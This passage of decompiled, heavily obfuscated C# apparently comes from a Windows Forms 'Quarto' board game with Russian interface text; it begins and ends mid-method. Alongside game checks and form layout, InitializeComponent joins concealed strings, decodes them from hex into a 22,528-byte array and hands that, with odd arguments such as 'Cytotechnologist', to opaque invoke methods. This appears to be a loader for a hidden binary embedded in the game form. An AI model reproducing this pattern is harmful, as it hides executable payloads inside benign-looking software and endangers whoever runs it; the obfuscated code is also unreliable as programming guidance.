						num = 1948301198;
						num6 = 1948301198;
					}
					else
					{
						num = 770126366;
						num6 = 770126366;
					}
					continue;
				}
				case 51u:
					if (mem[3, 0] != null)
					{
						num = (int)(num2 * 1900937168) ^ -348082625;
						continue;
					}
					goto IL_02d7;
				case 50u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)((num2 * 1419620377) ^ 0x48738A19);
						continue;
					}
					goto IL_0275;
				case 49u:
					if (mem[1, 2] != null)
					{
						num = (int)((num2 * 1980881238) ^ 0x5FC59A2F);
						continue;
					}
					goto IL_02d7;
				case 48u:
				{
					int num66;
					int num67;
					if (!flag3)
					{
						num66 = -1770392136;
						num67 = -1770392136;
					}
					else
					{
						num66 = -2113408282;
						num67 = -2113408282;
					}
					num = num66 ^ ((int)num2 * -273256976);
					continue;
				}
				case 46u:
				{
					int num56;
					int num57;
					if (mem[2, 2] == null)
					{
						num56 = 1197984727;
						num57 = 1197984727;
					}
					else
					{
						num56 = 999572222;
						num57 = 999572222;
					}
					num = num56 ^ ((int)num2 * -1618228947);
					continue;
				}
				case 45u:
				{
					int num48;
					int num49;
					if (mem[num3, 0].Big != mem[num3, 1].Big)
					{
						num48 = -734271531;
						num49 = -734271531;
					}
					else
					{
						num48 = -2108934837;
						num49 = -2108934837;
					}
					num = num48 ^ ((int)num2 * -865182448);
					continue;
				}
				case 44u:
				{
					int num44;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = 409201472;
						num44 = 409201472;
					}
					else
					{
						num = 394153847;
						num44 = 394153847;
					}
					continue;
				}
				case 43u:
				{
					int num40;
					if (mem[0, 3].Point == mem[1, 2].Point)
					{
						num = 206087025;
						num40 = 206087025;
					}
					else
					{
						num = 234561158;
						num40 = 234561158;
					}
					continue;
				}
				case 42u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = ((int)num2 * -228946604) ^ 0x6F9355A1;
						continue;
					}
					goto IL_0675;
				case 41u:
				{
					int num32;
					int num33;
					if (mem[1, num3].Big != mem[2, num3].Big)
					{
						num32 = -1883591574;
						num33 = -1883591574;
					}
					else
					{
						num32 = -1458699233;
						num33 = -1458699233;
					}
					num = num32 ^ (int)(num2 * 2000217649);
					continue;
				}
				case 40u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = ((int)num2 * -365682460) ^ 0x2E0AFB86;
						continue;
					}
					goto IL_031e;
				case 39u:
				{
					int num27;
					int num28;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num27 = -910701784;
						num28 = -910701784;
					}
					else
					{
						num27 = -1415250662;
						num28 = -1415250662;
					}
					num = num27 ^ (int)(num2 * 356831639);
					continue;
				}
				case 38u:
				{
					int num21;
					int num22;
					if (mem[1, 1].Big == mem[2, 2].Big)
					{
						num21 = -1295327610;
						num22 = -1295327610;
					}
					else
					{
						num21 = -1686226527;
						num22 = -1686226527;
					}
					num = num21 ^ ((int)num2 * -333743263);
					continue;
				}
				case 37u:
					if (mem[2, num3].Point != mem[3, num3].Point)
					{
						num = ((int)num2 * -538496881) ^ -1520056059;
						continue;
					}
					goto IL_0044;
				case 36u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = (int)((num2 * 1835132938) ^ 0x23145F7D);
						continue;
					}
					goto IL_042a;
				case 35u:
				{
					int num11;
					int num12;
					if (mem[num3, 1].Point != mem[num3, 2].Point)
					{
						num11 = 1638817265;
						num12 = 1638817265;
					}
					else
					{
						num11 = 2110009558;
						num12 = 2110009558;
					}
					num = num11 ^ ((int)num2 * -153928295);
					continue;
				}
				case 34u:
				{
					int num5;
					if (mem[num3, 0].Dark != mem[num3, 1].Dark)
					{
						num = 828867012;
						num5 = 828867012;
					}
					else
					{
						num = 1925005742;
						num5 = 1925005742;
					}
					continue;
				}
				case 33u:
					if (mem[3, num3] != null)
					{
						num = (int)(num2 * 688522346) ^ -661041312;
						continue;
					}
					goto IL_044d;
				case 32u:
				{
					int num71;
					int num72;
					if (mem[1, 1] == null)
					{
						num71 = 485826641;
						num72 = 485826641;
					}
					else
					{
						num71 = 720975621;
						num72 = 720975621;
					}
					num = num71 ^ ((int)num2 * -104857915);
					continue;
				}
				case 31u:
					num = ((int)num2 * -1583293559) ^ -922292377;
					continue;
				case 30u:
					if (mem[0, 3] != null)
					{
						num = 1613747802;
						continue;
					}
					goto IL_02d7;
				case 29u:
				{
					int num68;
					int num69;
					if (mem[1, 2].Dark != mem[2, 1].Dark)
					{
						num68 = 763557690;
						num69 = 763557690;
					}
					else
					{
						num68 = 421567553;
						num69 = 421567553;
					}
					num = num68 ^ ((int)num2 * -850429174);
					continue;
				}
				case 28u:
					num31 = ((mem[2, num3].Square == mem[3, num3].Square) ? 1 : 0);
					goto IL_0045;
				case 27u:
				{
					int num63;
					if (mem[num3, 0].Point == mem[num3, 1].Point)
					{
						num = 1796683320;
						num63 = 1796683320;
					}
					else
					{
						num = 2038358618;
						num63 = 2038358618;
					}
					continue;
				}
				case 26u:
					num4 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_0276;
				case 25u:
				{
					int num60;
					if (mem[num3, 0].Square != mem[num3, 1].Square)
					{
						num = 242135875;
						num60 = 242135875;
					}
					else
					{
						num = 1679351310;
						num60 = 1679351310;
					}
					continue;
				}
				case 24u:
				{
					int num52;
					int num53;
					if (mem[num3, 1].Big == mem[num3, 2].Big)
					{
						num52 = -1244854505;
						num53 = -1244854505;
					}
					else
					{
						num52 = -7096443;
						num53 = -7096443;
					}
					num = num52 ^ ((int)num2 * -1999175076);
					continue;
				}
				case 23u:
					flag = true;
					num = (int)((num2 * 162730815) ^ 0x23334605);
					continue;
				case 22u:
				{
					int num46;
					int num47;
					if (mem[num3, 0] != null)
					{
						num46 = 145384185;
						num47 = 145384185;
					}
					else
					{
						num46 = 1033873681;
						num47 = 1033873681;
					}
					num = num46 ^ (int)(num2 * 57802719);
					continue;
				}
				case 21u:
					if (mem[0, 3].Square == mem[1, 2].Square)
					{
						num = 1969637753;
						continue;
					}
					goto IL_0675;
				case 20u:
				{
					int num41;
					int num42;
					if (mem[num3, 1] != null)
					{
						num41 = -828408992;
						num42 = -828408992;
					}
					else
					{
						num41 = -1849506141;
						num42 = -1849506141;
					}
					num = num41 ^ (int)(num2 * 372443410);
					continue;
				}
				case 19u:
				{
					int num38;
					int num39;
					if (mem[num3, 2] != null)
					{
						num38 = -1596390596;
						num39 = -1596390596;
					}
					else
					{
						num38 = -1675468148;
						num39 = -1675468148;
					}
					num = num38 ^ (int)(num2 * 2056189853);
					continue;
				}
				case 18u:
					if (mem[2, 2].Point != mem[3, 3].Point)
					{
						num = ((int)num2 * -617283610) ^ 0x8603BA;
						continue;
					}
					goto IL_0275;
				case 17u:
				{
					int num34;
					int num35;
					if (mem[1, num3].Dark != mem[2, num3].Dark)
					{
						num34 = 1096704453;
						num35 = 1096704453;
					}
					else
					{
						num34 = 439146472;
						num35 = 439146472;
					}
					num = num34 ^ ((int)num2 * -541428395);
					continue;
				}
				case 16u:
					if (mem[2, num3] != null)
					{
						num = (int)((num2 * 406326252) ^ 0x2896DF62);
						continue;
					}
					goto IL_044d;
				case 15u:
					result = flag;
					num = 473462968;
					continue;
				case 14u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = ((int)num2 * -1327057025) ^ 0x15520A06;
						continue;
					}
					goto IL_042a;
				case 13u:
				{
					int num29;
					int num30;
					if (mem[0, 0] == null)
					{
						num29 = 576915626;
						num30 = 576915626;
					}
					else
					{
						num29 = 268262944;
						num30 = 268262944;
					}
					num = num29 ^ (int)(num2 * 693255711);
					continue;
				}
				case 12u:
				{
					int num26;
					if (num3 < 4)
					{
						num = 330136880;
						num26 = 330136880;
					}
					else
					{
						num = 222750014;
						num26 = 222750014;
					}
					continue;
				}
				case 10u:
				{
					int num23;
					int num24;
					if (flag2)
					{
						num23 = -77665560;
						num24 = -77665560;
					}
					else
					{
						num23 = -1623747832;
						num24 = -1623747832;
					}
					num = num23 ^ ((int)num2 * -2055963040);
					continue;
				}
				case 9u:
				{
					int num17;
					int num18;
					if (mem[1, 1].Point != mem[2, 2].Point)
					{
						num17 = 1058650089;
						num18 = 1058650089;
					}
					else
					{
						num17 = 1850491458;
						num18 = 1850491458;
					}
					num = num17 ^ (int)(num2 * 1566868539);
					continue;
				}
				case 8u:
				{
					int num13;
					int num14;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num13 = 742072544;
						num14 = 742072544;
					}
					else
					{
						num13 = 1209572733;
						num14 = 1209572733;
					}
					num = num13 ^ ((int)num2 * -684715150);
					continue;
				}
				case 7u:
					num = 1889409077;
					continue;
				case 6u:
				{
					int num7;
					int num8;
					if (mem[1, num3].Point != mem[2, num3].Point)
					{
						num7 = 917894484;
						num8 = 917894484;
					}
					else
					{
						num7 = 1222302340;
						num8 = 1222302340;
					}
					num = num7 ^ (int)(num2 * 489750295);
					continue;
				}
				case 5u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = (int)((num2 * 557307315) ^ 0xA99F6B3);
						continue;
					}
					goto IL_031e;
				case 4u:
					if (mem[0, num3] != null)
					{
						num = 585125569;
						continue;
					}
					goto IL_044d;
				case 3u:
					if (mem[2, 2].Big != mem[3, 3].Big)
					{
						num = ((int)num2 * -689286217) ^ -1407727942;
						continue;
					}
					goto IL_0275;
				case 2u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = ((int)num2 * -565984696) ^ 0x6B9998EA;
						continue;
					}
					goto IL_042a;
				case 1u:
					if (mem[2, num3].Big != mem[3, num3].Big)
					{
						num = ((int)num2 * -1782279541) ^ 0x18DBA78C;
						continue;
					}
					goto IL_0044;
				case 0u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = (int)((num2 * 1747770833) ^ 0xF5B0CCB);
						continue;
					}
					goto IL_0240;
				case 47u:
					break;
				default:
					{
						return result;
					}
					IL_031e:
					num4 = 1;
					goto IL_0276;
					IL_02d7:
					num4 = 0;
					goto IL_0276;
					IL_044d:
					num31 = 0;
					goto IL_0045;
					IL_0045:
					flag3 = (byte)num31 != 0;
					num = 191880491;
					continue;
					IL_042a:
					num31 = 1;
					goto IL_0045;
					IL_0276:
					flag2 = (byte)num4 != 0;
					num = 848738321;
					continue;
					IL_0675:
					num4 = 0;
					goto IL_0276;
					IL_0275:
					num4 = 1;
					goto IL_0276;
					IL_0240:
					num31 = 0;
					goto IL_0045;
					IL_0044:
					num31 = 1;
					goto IL_0045;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag = true;
		int num = 0;
		int num5 = default(int);
		bool result = default(bool);
		while (true)
		{
			int num2;
			int num3;
			if (num >= 4)
			{
				num2 = 1476160844;
				num3 = 1476160844;
			}
			else
			{
				num2 = 1499161765;
				num3 = 1499161765;
			}
			while (true)
			{
				uint num4;
				switch ((num4 = (uint)num2 ^ 0x6C5E9433u) % 12u)
				{
				case 11u:
					num2 = ((int)num4 * -361079381) ^ 0x4AA1CE47;
					continue;
				case 10u:
					num5 = 0;
					num2 = 851307259;
					continue;
				case 9u:
					num2 = 1499161765;
					continue;
				case 8u:
					num2 = (int)(num4 * 25398452) ^ -2938963;
					continue;
				case 7u:
				{
					int num7;
					if (mem[num, num5] == null)
					{
						num2 = 2145934158;
						num7 = 2145934158;
					}
					else
					{
						num2 = 995726699;
						num7 = 995726699;
					}
					continue;
				}
				case 6u:
					num++;
					num2 = ((int)num4 * -1217202468) ^ -1871793097;
					continue;
				case 5u:
					flag = false;
					num2 = ((int)num4 * -1481463335) ^ 0xF80F09E;
					continue;
				case 3u:
					result = flag;
					num2 = (int)(num4 * 1884830257) ^ -1991031865;
					continue;
				case 2u:
				{
					int num6;
					if (num5 >= 4)
					{
						num2 = 2144420281;
						num6 = 2144420281;
					}
					else
					{
						num2 = 1289507596;
						num6 = 1289507596;
					}
					continue;
				}
				case 0u:
					num5++;
					num2 = 913416973;
					continue;
				case 4u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		while (true)
		{
			int num = -189156504;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8ED3189Du) % 11u)
				{
				case 10u:
					num = (int)((num2 * 2114367270) ^ 0x749B6A9C);
					continue;
				case 9u:
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = ((int)num2 * -874737622) ^ 0x7A7B0696;
					continue;
				case 8u:
					Form1.smethod_32((Control)(object)label1, "");
					num = ((int)num2 * -1143064523) ^ 0x7A621D9B;
					continue;
				case 6u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					num = ((int)num2 * -2052234740) ^ -766685956;
					continue;
				case 5u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)((num2 * 1296834201) ^ 0x146E66B4);
					continue;
				case 4u:
					Form1.smethod_32((Control)(object)label2, "");
					num = ((int)num2 * -1745905752) ^ 0x668A84DE;
					continue;
				case 3u:
					num = ((int)num2 * -1296877837) ^ -2128117068;
					continue;
				case 2u:
					num = ((int)num2 * -1171086221) ^ -1518747874;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label5, "Игрок: ");
					num = ((int)num2 * -47026712) ^ -1946504742;
					continue;
				default:
					return;
				case 7u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (!disposing)
		{
			goto IL_0009;
		}
		goto IL_0016;
		IL_0016:
		int num = 853285052;
		goto IL_0061;
		IL_0061:
		int num3;
		while (true)
		{
			uint num2;
			switch ((num2 = (uint)num ^ 0x56AA53E2u) % 7u)
			{
			case 6u:
				break;
			case 5u:
				Form1.smethod_51((IDisposable)components);
				num = ((int)num2 * -85458054) ^ 0x73966F03;
				continue;
			case 4u:
				((Form)this).Dispose(disposing);
				num = 2144684756;
				continue;
			case 3u:
				num = ((int)num2 * -407556432) ^ 0x628E12BE;
				continue;
			case 1u:
				num = (int)((num2 * 1015449037) ^ 0x6EF9A189);
				continue;
			default:
				return;
			case 2u:
				goto IL_008e;
			case 0u:
				return;
			}
			break;
			IL_008e:
			if (components != null)
			{
				num = 1117396924;
				num3 = 1117396924;
				continue;
			}
			goto IL_0009;
		}
		goto IL_0016;
		IL_0009:
		num = 170680603;
		num3 = 170680603;
		goto IL_0061;
	}

	private void InitializeComponent()
	{
		//IL_0625: Unknown result type (might be due to invalid IL or missing references)
		//IL_062f: Expected O, but got Unknown
		int num3 = default(int);
		byte[] array = default(byte[]);
		object[] object_ = default(object[]);
		string string_ = default(string);
		while (true)
		{
			int num = 1137808802;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x5EBAFD3Bu) % 133u)
				{
				case 132u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = ((int)num2 * -20508832) ^ 0x79BDF92;
					continue;
				case 131u:
					num = (int)(num2 * 1398108717) ^ -1498957502;
					continue;
				case 130u:
					num = ((int)num2 * -853292341) ^ 0x56FB0C22;
					continue;
				case 129u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1253422935) ^ 0x565AD3D;
					continue;
				case 128u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = ((int)num2 * -529433489) ^ 0x3E7EDB4C;
					continue;
				case 127u:
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -292656186) ^ -297238913;
					continue;
				case 125u:
					Form1.smethod_64((Control)(object)label1, 8);
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = (int)((num2 * 1246421403) ^ 0x3662A462);
					continue;
				case 124u:
					num = (int)((num2 * 1711577959) ^ 0x2B3BF874);
					continue;
				case 123u:
					num = (int)(num2 * 1016101727) ^ -821398074;
					continue;
				case 122u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = ((int)num2 * -1407525296) ^ -252469191;
					continue;
				case 121u:
					button1 = Form1.smethod_53();
					num = ((int)num2 * -2035620725) ^ 0x290D81BF;
					continue;
				case 120u:
					num3++;
					num = (int)(num2 * 915223177) ^ -499678240;
					continue;
				case 119u:
					num = ((int)num2 * -1922225589) ^ 0x1F29C2DF;
					continue;
				case 118u:
					button2 = Form1.smethod_53();
					num = (int)(num2 * 1283570146) ^ -1528058613;
					continue;
				case 117u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = (int)(num2 * 1063320143) ^ -1111982848;
					continue;
				case 116u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = ((int)num2 * -1288750605) ^ 0x686479E8;
					continue;
				case 115u:
					array = new byte[22528];
					num3 = 0;
					num = (int)((num2 * 1421057556) ^ 0xF14708D);
					continue;
				case 114u:
					num = ((int)num2 * -2017473598) ^ 0xAE644EE;
					continue;
				case 113u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)(num2 * 1989591164) ^ -578745958;
					continue;
				case 112u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -1250371353) ^ -1184367294;
					continue;
				case 111u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -1999999168) ^ 0x40F7ED24;
					continue;
				case 110u:
					num = ((int)num2 * -1645354009) ^ 0x27513E20;
					continue;
				case 109u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)(num2 * 1530120591) ^ -1421247002;
					continue;
				case 108u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					num = ((int)num2 * -570698601) ^ -715058016;
					continue;
				case 107u:
					Form1.smethod_92((Control)(object)this);
					num = (int)((num2 * 789234382) ^ 0x1B715D61);
					continue;
				case 106u:
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -1930563448) ^ 0x75ECA297;
					continue;
				case 105u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = (int)(num2 * 1867015695) ^ -886795684;
					continue;
				case 104u:
					string_ = Veet.Sa;
					num = ((int)num2 * -66328702) ^ 0x6BB7A614;
					continue;
				case 103u:
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -256059498) ^ 0x6A79A190;
					continue;
				case 102u:
				{
					int num4;
					if (num3 >= 22528)
					{
						num = 252253205;
						num4 = 252253205;
					}
					else
					{
						num = 1932885306;
						num4 = 1932885306;
					}
					continue;
				}
				case 101u:
					num = (int)((num2 * 1714781820) ^ 0x39FB438B);
					continue;
				case 99u:
					num = ((int)num2 * -1846469503) ^ -2090358369;
					continue;
				case 98u:
					components = Form1.smethod_52();
					num = ((int)num2 * -1421210003) ^ -194968657;
					continue;
				case 97u:
					num = ((int)num2 * -264281650) ^ -79933707;
					continue;
				case 96u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)(num2 * 719398096) ^ -255292010;
					continue;
				case 95u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)(num2 * 1014499133) ^ -698353696;
					continue;
				case 94u:
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					Form1.smethod_61((Control)(object)label6, "label6");
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					Form1.smethod_64((Control)(object)label6, 13);
					num = (int)((num2 * 563442450) ^ 0x505F94E4);
					continue;
				case 93u:
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)(num2 * 1756319824) ^ -1014813070;
					continue;
				case 92u:
					num = (int)((num2 * 533982587) ^ 0x5E83BA4A);
					continue;
				case 91u:
					Form1.smethod_70(ComMember, object_);
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = (int)((num2 * 1120017104) ^ 0x793D26A6);
					continue;
				case 90u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)((num2 * 1616381396) ^ 0xBEE0769);
					continue;
				case 89u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					num = ((int)num2 * -1246293608) ^ -1467790148;
					continue;
				case 88u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)(num2 * 1909902560) ^ -311230060;
					continue;
				case 87u:
					num = ((int)num2 * -2052575755) ^ -1394291949;
					continue;
				case 86u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 2060438852) ^ 0x5DC9C661);
					continue;
				case 85u:
					num = ((int)num2 * -1313928261) ^ -455833031;
					continue;
				case 84u:
					num = ((int)num2 * -1749534661) ^ -1305330988;
					continue;
				case 83u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)(num2 * 2094704064) ^ -1627906330;
					continue;
				case 82u:
					num = ((int)num2 * -1085803255) ^ 0x2D7C9B70;
					continue;
				case 81u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)((num2 * 300631733) ^ 0x4E3E155A);
					continue;
				case 80u:
					Form1.smethod_61((Control)(object)label5, "label5");
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 2145653838) ^ 0x40F05F9);
					continue;
				case 79u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)((num2 * 1380374635) ^ 0x4B24F949);
					continue;
				case 78u:
					Form1.smethod_64((Control)(object)button2, 4);
					num = ((int)num2 * -1166112626) ^ 0x7BB4AABF;
					continue;
				case 77u:
					num = (int)((num2 * 659479283) ^ 0x33D12A22);
					continue;
				case 76u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -2020187563) ^ -780563191;
					continue;
				case 75u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -1345149969) ^ -1961851364;
					continue;
				case 74u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(string_, num3 * 2, 2), 16);
					num = 1601070100;
					continue;
				case 73u:
					string_ = Form1.smethod_34(string_, Veet.Xe);
					string_ = Form1.smethod_34(string_, Veet.Zr);
					num = (int)(num2 * 1936883792) ^ -737792950;
					continue;
				case 72u:
					num = ((int)num2 * -146574205) ^ -1895725264;
					continue;
				case 71u:
					num = (int)((num2 * 293324777) ^ 0x33D62832);
					continue;
				case 70u:
					num = (int)(num2 * 379237429) ^ -919522499;
					continue;
				case 69u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = ((int)num2 * -1106827318) ^ 0x69687499;
					continue;
				case 68u:
					num = ((int)num2 * -638168165) ^ 0x1D1F13BF;
					continue;
				case 67u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)((num2 * 650629373) ^ 0x7306E01B);
					continue;
				case 66u:
					num = (int)(num2 * 1520289131) ^ -227663168;
					continue;
				case 65u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = ((int)num2 * -602619511) ^ 0x4DAC874E;
					continue;
				case 64u:
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -1647865999) ^ -948509163;
					continue;
				case 63u:
					num = (int)((num2 * 1439024880) ^ 0x362E4297);
					continue;
				case 62u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = ((int)num2 * -1707816481) ^ -223283970;
					continue;
				case 61u:
					label1 = Form1.smethod_57();
					label2 = Form1.smethod_57();
					num = ((int)num2 * -1787216382) ^ -261725773;
					continue;
				case 60u:
					num = ((int)num2 * -2011870891) ^ -2042587194;
					continue;
				case 59u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 1102645913) ^ 0x53A4FB3B);
					continue;
				case 58u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)((num2 * 258190338) ^ 0x5B58DB44);
					continue;
				case 57u:
					richTextBox1 = Form1.smethod_54();
					num = (int)((num2 * 2111355323) ^ 0x57C16FFA);
					continue;
				case 56u:
					num = ((int)num2 * -1685989337) ^ -1153997634;
					continue;
				case 55u:
					num = (int)(num2 * 1252824744) ^ -1199220026;
					continue;
				case 54u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -193806319) ^ -1208321356;
					continue;
				case 53u:
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1161696648) ^ -305893884;
					continue;
				case 52u:
					CharArray(array, string.Empty);
					num = ((int)num2 * -893649769) ^ -1861359853;
					continue;
				case 51u:
					Form1.smethod_65((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1022285142) ^ 0x164CAE43;
					continue;
				case 50u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = (int)(num2 * 1262110546) ^ -633825791;
					continue;
				case 49u:
					Form1.smethod_73(timer1, (EventHandler)Timer1_Tick);
					num = ((int)num2 * -197780221) ^ -1932402181;
					continue;
				case 48u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					num = ((int)num2 * -1282636308) ^ 0x2AC0D763;
					continue;
				case 47u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					num = (int)((num2 * 1968526304) ^ 0x3E7B2A66);
					continue;
				case 46u:
					num = ((int)num2 * -1584008610) ^ -1196409217;
					continue;
				case 45u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = ((int)num2 * -251264603) ^ 0x246E5B31;
					continue;
				case 44u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = (int)(num2 * 1776075920) ^ -1005481271;
					continue;
				case 43u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -1480295565) ^ -391784668;
					continue;
				case 42u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = (int)((num2 * 1417929017) ^ 0x62956611);
					continue;
				case 41u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = (int)(num2 * 2069839531) ^ -1837563174;
					continue;
				case 40u:
					Form1.smethod_79((ContainerControl)(object)this, new SizeF(6f, 13f));
					num = (int)(num2 * 119683780) ^ -215707540;
					continue;
				case 39u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -2062233905) ^ 0x3418686E;
					continue;
				case 38u:
					pictureBox1 = Form1.smethod_2();
					num = (int)((num2 * 1586960027) ^ 0x5ECAC218);
					continue;
				case 37u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)(num2 * 802558701) ^ -356048734;
					continue;
				case 36u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = (int)((num2 * 1865668948) ^ 0x46333FF6);
					continue;
				case 35u:
					num = (int)((num2 * 1251588696) ^ 0x39931120);
					continue;
				case 34u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -60676669) ^ 0x33EDB228;
					continue;
				case 33u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)((num2 * 2004075160) ^ 0x56F82438);
					continue;
				case 32u:
					num = ((int)num2 * -1298422577) ^ 0x5B58E66A;
					continue;
				case 31u:
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -1673284466) ^ -1098151901;
					continue;
				case 30u:
					num = (int)(num2 * 2033210916) ^ -177448914;
					continue;
				case 29u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)((num2 * 470518688) ^ 0x38AB5CC8);
					continue;
				case 28u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					num = ((int)num2 * -1054376212) ^ 0x3D8DCB8B;
					continue;
				case 27u:
					Form1.smethod_89((Control)(object)this, (EventHandler)Form1_LocationChanged);
					num = ((int)num2 * -1292480902) ^ 0x4173C35F;
					continue;
				case 26u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)(num2 * 1288828031) ^ -534254338;
					continue;
				case 25u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = ((int)num2 * -1653878557) ^ -480421255;
					continue;
				case 24u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					num = ((int)num2 * -1922790172) ^ 0x3D913DEE;
					continue;
				case 23u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)richTextBox1);
					num = (int)((num2 * 1331126363) ^ 0x4090771E);
					continue;
				case 22u:
					num = ((int)num2 * -271569371) ^ 0x29E2475C;
					continue;
				case 21u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = (int)(num2 * 1040266056) ^ -607799583;
					continue;
				case 20u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)((num2 * 1077830093) ^ 0x1691B34D);
					continue;
				case 19u:
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -1833635454) ^ 0x2F272934;
					continue;
